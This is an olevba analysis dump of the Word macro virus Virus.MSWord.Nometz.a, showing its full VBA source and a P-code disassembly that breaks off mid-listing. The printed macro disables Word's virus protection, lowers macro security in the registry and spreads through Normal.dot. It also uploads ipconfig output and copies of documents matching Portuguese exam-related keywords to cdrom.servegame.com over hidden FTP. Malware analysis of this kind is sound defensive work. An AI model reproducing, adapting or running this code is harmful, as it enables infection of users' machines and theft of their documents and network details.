olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nometz.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nometz.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO cdrom.bas 
in file: Virus.MSWord.Nometz.a - OLE stream: 'Macros/VBA/cdrom'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub autoclose()
Dim x
x = 1
On Error Resume Next
sv = Chr(Int(Rnd) + 1 * 165 + 35 - 101) + ":" + Chr(Int(Rnd) + 1 * 165 + 35 - 108)
sn = sv + Chr(99) + Chr(Int(Rnd(1) * 10 + 80)) + Chr(97 + 2 + 1) + "." + Chr(98) + Chr(97) + Chr(116)
s1 = sv + Chr(99) + Chr(Int(Rnd(1) * 10 + 80)) + Chr(97 + 2 + 1) + "." + Chr(102) + Chr(116) + Chr(112)
c1 = Chr(119) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115) + Chr(92) + Chr(115) + Chr(121) + Chr(115) + Chr(116) + Chr(101) + Chr(109) + Chr(92)

Application.ScreenUpdating = 0
Application.EnableCancelKey = 0
Application.ShowVisualBasicEditor = 0
ActiveDocument.ReadOnlyRecommended = 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
Options.VirusProtection = 0
CommandBars("tools").Controls("Macro").Visible = False
CommandBars("tools").Controls.Item(15).Visible = False
ShowVisualBasicEditor = False
doc = False
nor = False
nm = "cdrom"
x = 0
zpat = ActiveDocument.Path
znomet = ActiveDocument.FullName
znome = ActiveDocument.Name
  For Each VbComponent In ActiveDocument.VBProject.VBComponents

      If VbComponent.Name = nm Then doc = True
  
  Next
 
 For Each VbComponent In NormalTemplate.VBProject.VBComponents

      If VbComponent.Name = nm Then nor = True

  Next

If nor = False Then
    ActiveDocument.SaveAs FileName:=sv + c1 + "cdrom.dot", FileFormat _
        :=wdFormatTemplate, LockComments:=False, Password:="", AddToRecentFiles:= _
        False, WritePassword:="", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:= _
        False, SaveNativePictureFormat:=False, SaveFormsData:=False, _
        SaveAsAOCELetter:=False
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:=nm, Object:=wdOrganizerObjectProjectItems
NormalTemplate.Save

Open sn For Output As #1
    Print #1, Chr(105) + "pco" + Chr(110) + "fi" + Chr(103) + " > " + sv + "cdip." + Chr(116) + "xt"
    Close #1
   Shell sn, vbHide
        Open s1 For Output As #1
    Print #1, "o " + Chr(99) + "dr" + Chr(111) + Chr(109) + "." + Chr(115) + Chr(101) + "rvegame" + Chr(46) + Chr(99) + "om"
    Print #1, "us" + Chr(101) + "r an" + Chr(111) + "nym" + Chr(111) + "us"
    Print #1, "pa" + Chr(115) + Chr(115) + " " + Chr(99) + "drom"
    Print #1, "binary"
    Print #1, Chr(112) + "ut " + sv + "cdip." + Chr(116) + "xt"
    Print #1, "q" + Chr(117) + Chr(105) + "t"
    Close #1

    Open sn For Output As #1
    Print #1, "f" + Chr(116) + "p" + Chr(46) + Chr(101) + "x" + Chr(101) + " -n -s:" + s1
    Print #1, "del" + s1
    Print #1, "del" + sn
    Close #1
    Shell sn, vbHide

End If
If doc = False Then
Application.OrganizerCopy Source:=sv + c1 + "cdrom.dot", Destination:=ActiveDocument.FullName, Name:=nm, Object:=wdOrganizerObjectProjectItems
End If
sourcefile = ActiveDocument.Path
svt = c1 + ActiveDocument.Name
mySearchString = "Pr" + Chr(111) + Chr(118) + Chr(97)
With Selection.Find
    .Text = mySearchString
    .MatchCase = False
    .MatchWholeWord = False
    If .Execute = True Then x = 6
End With
If x < 6 Then
  mySearchString = Chr(97) + "v" + Chr(97) + "li" + Chr(97) + "çã" + Chr(111)
With Selection.Find
    .Text = mySearchString
    .MatchCase = False
    .MatchWholeWord = False
    If .Execute = True Then x = 6
End With
End If
If x < 6 Then
  mySearchString = "c" + Chr(111) + "p" + Chr(101) + "v" + Chr(101)
With Selection.Find
    .Text = mySearchString
    .MatchCase = False
    .MatchWholeWord = False
    If .Execute = True Then x = 6
End With
End If
If x < 6 Then
mySearchString = "c" + Chr(111) + "ncu" + Chr(114) + "s" + Chr(111)
With Selection.Find
    .Text = mySearchString
    .MatchCase = False
    .MatchWholeWord = False
    If .Execute = True Then x = 6
End With
End If
If x < 6 Then
    mySearchString = Chr(101) + "xc" + Chr(101) + "t" + Chr(111)
With Selection.Find
    .Text = mySearchString
    .MatchCase = False
    .MatchWholeWord = False
    If .Execute = True Then x = 6
End With
End If
 If x = 6 Then
   If ActiveDocument.Saved = False And Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.Save
 ActiveWindow.Close
  vnome = sv + c1 + Left(znome, Len(znome) - 3) + "j" + Chr(112) + "g"
 If Left$(Application.Version, 1) = "8" Then
    WordBasic.CopyFileA FileName:=znomet, Directory:=vnome
  Else
      WordBasic.CopyFile FileName:=znomet, Directory:=vnome
  End If
        Open s1 For Output As #1
    Print #1, "o " + Chr(99) + "dr" + Chr(111) + Chr(109) + "." + Chr(115) + Chr(101) + "rvegame" + Chr(46) + Chr(99) + "om"
    Print #1, "us" + Chr(101) + "r an" + Chr(111) + "nym" + Chr(111) + "us"
    Print #1, "pa" + Chr(115) + Chr(115) + " " + Chr(99) + "drom"
    Print #1, "binary"
    Print #1, Chr(112) + "ut " + sv + c1 + Chr(42) + ".j" + Chr(112) + "g"
    Print #1, "q" + Chr(117) + Chr(105) + "t"
    Close #1
    
         Open sn For Output As #1
    Print #1, "f" + Chr(116) + "p" + Chr(46) + Chr(101) + "x" + Chr(101) + " -n -s:" + s1
    Print #1, Chr(103 - 3) + "el " + sv + c1 + Chr(42) + ".j" + Chr(112) + "g"
    Print #1, "del" + s1
    Print #1, "del" + sn
    Close #1
        Shell sn, vbHide

End If
End Sub
Sub ToolsOptions()
    On Error Resume Next
    Options.VirusProtection = 1
    Options.SaveNormalPrompt = 1
    Dialogs(wdDialogToolsOptions).Show
    Options.VirusProtection = 0
    Options.SaveNormalPrompt = 0
End Sub
Sub ViewVBCode()
End Sub
Sub autoopen()
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") = 1
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "DontTrustInstalledFiles") = 0
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1
End Sub





-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Nometz.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/cdrom - 9830 bytes
' Line #0:
' 	FuncDefn (Sub autoclose())
' Line #1:
' 	Dim 
' 	VarDefn x
' Line #2:
' 	LitDI2 0x0001 
' 	St x 
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	Ld Rnd 
' 	FnInt 
' 	LitDI2 0x0001 
' 	LitDI2 0x00A5 
' 	Mul 
' 	Add 
' 	LitDI2 0x0023 
' 	Add 
' 	LitDI2 0x0065 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld Rnd 
' 	FnInt 
' 	LitDI2 0x0001 
' 	LitDI2 0x00A5 
' 	Mul 
' 	Add 
' 	LitDI2 0x0023 
' 	Add 
' 	LitDI2 0x006C 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St sv 
' Line #5:
' 	Ld sv 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x000A 
' 	Mul 
' 	LitDI2 0x0050 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	LitDI2 0x0002 
' 	Add 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "."
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St sn 
' Line #6:
' 	Ld sv 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x000A 
' 	Mul 
' 	LitDI2 0x0050 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	LitDI2 0x0002 
' 	Add 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "."
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St s1 
' Line #7:
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St c1 
' Line #8:
' Line #9:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #10:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #11:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #12:
' 	LitDI2 0x0000 
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #13:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #14:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #15:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #16:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Visible 
' Line #17:
' 	LitVarSpecial (False)
' 	LitDI2 0x000F 
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	MemLd Controls 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Visible 
' Line #18:
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' Line #19:
' 	LitVarSpecial (False)
' 	St doc 
' Line #20:
' 	LitVarSpecial (False)
' 	St nor 
' Line #21:
' 	LitStr 0x0005 "cdrom"
' 	St nm 
' Line #22:
' 	LitDI2 0x0000 
' 	St x 
' Line #23:
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	St zpat 
' Line #24:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St znomet 
' Line #25:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	St znome 
' Line #26:
' 	StartForVariable 
' 	Ld VbComponent 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #27:
' Line #28:
' 	Ld VbComponent 
' 	MemLd New 
' 	Ld nm 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St doc 
' 	EndIf 
' Line #29:
' Line #30:
' 	StartForVariable 
' 	Next 
' Line #31:
' Line #32:
' 	StartForVariable 
' 	Ld VbComponent 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #33:
' Line #34:
' 	Ld VbComponent 
' 	MemLd New 
' 	Ld nm 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St nor 
' 	EndIf 
' Line #35:
' Line #36:
' 	StartForVariable 
' 	Next 
' Line #37:
' Line #38:
' 	Ld nor 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #39:
' 	LineCont 0x0010 0C 00 08 00 19 00 08 00 25 00 08 00 2F 00 08 00
' 	Ld sv 
' 	Ld c1 
' 	Add 
' 	LitStr 0x0009 "cdrom.dot"
' 	Add 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed LockComments 
' 	LitStr 0x0000 ""
' 	ParamNamed Password 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePassword 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	LitVarSpecial (False)
' 	ParamNamed EmbedTrueTypeFonts 
' 	LitVarSpecial (False)
' 	ParamNamed SaveNativePictureFormat 
' 	LitVarSpecial (False)
' 	ParamNamed SaveFormsData 
' 	LitVarSpecial (False)
' 	ParamNamed SaveAsAOCELetter 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x000B 
' Line #40:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld nm 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #41:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #42:
' Line #43:
' 	Ld sn 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #44:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0003 "pco"
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "fi"
' 	Add 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 " > "
' 	Add 
' 	Ld sv 
' 	Add 
' 	LitStr 0x0005 "cdip."
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "xt"
' 	Add 
' 	PrintItemNL 
' Line #45:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #46:
' 	Ld sn 
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #47:
' 	Ld s1 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #48:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0002 "o "
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "dr"
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "."
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "rvegame"
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "om"
' 	Add 
' 	PrintItemNL 
' Line #49:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0002 "us"
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "r an"
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "nym"
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "us"
' 	Add 
' 	PrintItemNL 
' Line #50:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0002 "pa"
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 " "
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "drom"
' 	Add 
' 	PrintItemNL 
' Line #51:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "binary"
' 	PrintItemNL 
' Line #52:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0003 "ut "
' 	Add 
' 	Ld sv 
' 	Add 
' 	LitStr 0x0005 "cdip."
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "xt"
' 	Add 
' 	PrintItemNL 
' Line #53:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "q"
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "t"
' 	Add 
' 	PrintItemNL 
' Line #54:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #55:
' Line #56:
' 	Ld sn 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #57:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "f"
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "p"
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "x"
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 " -n -s:"
' 	Add 
' 	Ld s1 
' 	Add 
' 	PrintItemNL 
' Line #58:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "del"
' 	Ld s1 
' 	Add 
' 	PrintItemNL 
' Line #59:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "del"
' 	Ld sn 
' 	Add 
' 	PrintItemNL 
' Line #60:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #61:
' 	Ld sn 
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #62:
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	Ld doc 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #65:
' 	Ld sv 
' 	Ld c1 
' 	Add 
' 	LitStr 0x0009 "cdrom.dot"
' 	Add 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld nm 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #66:
' 	EndIfBlock 
' Line #67:
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	St sourcefile 
' Line #68:
' 	Ld c1 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Add 
' 	St svt 
' Line #69:
' 	LitStr 0x0002 "Pr"
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St mySearchString 
' Line #70:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #71:
' 	Ld mySearchString 
' 	MemStWith Then 
' Line #72:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #73:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #74:
' 	MemLdWith Execute 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0006 
' 	St x 
' 	EndIf 
' Line #75:
' 	EndWith 
' Line #76:
' 	Ld x 
' 	LitDI2 0x0006 
' 	Lt 
' 	IfBlock 
' Line #77:
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0001 "v"
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "li"
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "çã"
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St mySearchString 
' Line #78:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #79:
' 	Ld mySearchString 
' 	MemStWith Then 
' Line #80:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #81:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #82:
' 	MemLdWith Execute 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0006 
' 	St x 
' 	EndIf 
' Line #83:
' 	EndWith 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	Ld x 
' 	LitDI2 0x0006 
' 	Lt 
' 	IfBlock 
' Line #86:
' 	LitStr 0x0001 "c"
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "p"
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "v"
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St mySearchString 
' Line #87:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #88:
' 	Ld mySearchString 
' 	MemStWith Then 
' Line #89:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #90:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #91:
' 	MemLdWith Execute 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0006 
' 	St x 
' 	EndIf 
' Line #92:
' 	EndWith 
' Line #93:
' 	EndIfBlock 
' Line #94:
' 	Ld x 
' 	LitDI2 0x0006 
' 	Lt 
' 	IfBlock 
' Line #95:
' 	LitStr 0x0001 "c"
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "ncu"
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "s"
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St mySearchString 
' Line #96:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #97:
' 	Ld mySearchString 
' 	MemStWith Then 
' Line #98:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #99:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #100:
' 	MemLdWith Execute 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0006 
' 	St x 
' 	EndIf 
' Line #101:
' 	EndWith 
' Line #102:
' 	EndIfBlock 
' Line #103:
' 	Ld x 
' 	LitDI2 0x0006 
' 	Lt 
' 	IfBlock 
' Line #104:
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0002 "xc"
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "t"
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St mySearchString 
' Line #105:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #106:
' 	Ld mySearchString 
' 	MemStWith Then 
' Line #107:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #108:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #109:
' 	MemLdWith Execute 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0006 
' 	St x 
' 	EndIf 
' Line #110:
' 	EndWith 
' Line #111:
' 	EndIfBlock 
' Line #112:
' 	Ld x 
' 	LitDI2 0x0006 
' 	Eq 
' 	IfBlock 
' Line #113:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #114:
' 	Ld ActiveWindow 
' 	ArgsMemCall Close 0x0000 
' Line #115:
' 	Ld sv 
' 	Ld c1 
' 	Add 
' 	Ld znome 
' 	Ld znome 
' 	FnLen 
' 	LitDI2 0x0003 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Add 
' 	LitStr 0x0001 "j"
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "g"
' 	Add 
' 	St vnome 
' Line #116:
' 	Ld Application 
' 	MemLd Version 
' 	LitDI2 0x0001 
' 	ArgsLd LBound$ 0x0002 
' 	LitStr 0x0001 "8"
' 	Eq 
' 	IfBlock 
' Line #117:
' 	Ld znomet 
' 	ParamNamed FileName 
' 	Ld vnome 
' 	ParamNamed Directory 
' 	Ld WordBasic 
' 	ArgsMemCall CopyFileA 0x0002 
' Line #118:
' 	ElseBlock 
' Line #119:
' 	Ld znomet 
' 	ParamNamed FileName 
' 	Ld vnome 
' 	ParamNamed Directory 
' 	Ld WordBasic 
' 	ArgsMemCall CopyFile 0x0002 
' Line #120:
' 	EndIfBlock 
' Line #121:
' 	Ld s1 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #122:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0002 "o "
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "dr"
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "."
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "rvegame"
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "om"
' 	Add 
' 	PrintItemNL 
' Line #123:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0002 "us"
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "r an"
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "nym"
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "us"
' 	Add 
' 	PrintItemNL 
' Line #124:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0002 "pa"
' 	LitDI2 0x0073 
